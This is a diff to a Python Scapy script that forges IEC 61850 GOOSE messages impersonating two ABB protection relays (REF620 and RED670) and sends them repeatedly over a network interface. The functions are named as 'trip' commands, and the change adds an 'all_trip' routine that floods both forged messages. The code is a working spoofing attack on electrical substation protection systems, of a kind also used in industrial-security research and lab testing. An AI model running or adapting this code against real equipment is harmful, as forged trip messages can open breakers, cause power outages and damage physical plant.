@@ -70,7 +70,7 @@ class GoosePDU(Packet):
                    ]
 
 
-def ref620_trip():
+def ref620_packet():
     ethernet_mac = Ether(src='00:21:c1:50:52:95', dst='01:0c:cd:01:00:01', type=0x88b8)
     goose_pdu = GoosePDU(gocbRef="ABBREF620LD0/LLN0$GO$Control_DataSet",
                          timeAllowedtoLive=num2str(2200),
@@ -88,12 +88,10 @@ def ref620_trip():
     goose_pdu.sequence_l = (len(goose_pdu)+len(goose_data)-2)
     goose_header = GooseHeader(appid=12289, length=len(goose_pdu)+len(goose_data)+8)
     goose_packet = ethernet_mac / goose_header / goose_pdu / goose_data
-    for i in range(PACKET_QTY):
-        sendp(goose_packet, iface=INTERFACE)
-    return "DONE"
+    return goose_packet
 
 
-def red670_trip():
+def red670_packet():
     ethernet_mac = Ether(src='00:00:23:2d:24:05', dst='01:0c:cd:01:00:00', type=0x88b8)
     goose_pdu = GoosePDU(gocbRef="ABBRED670LD0/LLN0$GO$gcbGOOSE",
                          timeAllowedtoLive=num2str(11000),
@@ -111,13 +109,33 @@ def red670_trip():
     goose_pdu.sequence_l = (len(goose_pdu) + len(goose_data) - 2)
     goose_header = GooseHeader(appid=12290, length=len(goose_pdu) + len(goose_data)+8)
     goose_packet = ethernet_mac / goose_header / goose_pdu / goose_data
+    return goose_packet
+
+
+def ref620_trip():
+    packet = ref620_packet()
     for i in range(PACKET_QTY):
-        sendp(goose_packet, iface=INTERFACE)
+        sendp(packet, iface=INTERFACE)
+    return "DONE"
+
+
+def red670_trip():
+    packet = red670_packet()
+    for i in range(PACKET_QTY):
+        sendp(packet, iface=INTERFACE)
+    return "DONE"
+
+
+def all_trip():
+    packet1 = ref620_packet()
+    packet2 = red670_packet()
+    for i in range(PACKET_QTY):
+        sendp(packet1, iface=INTERFACE)
+        sendp(packet2, iface=INTERFACE)
     return "DONE"
 
 
 if __name__ == '__main__':
     print("GOOSE packet for Scapy by Sever Sudakov")
-    ref620_trip()
-    red670_trip()
+    all_trip()
 
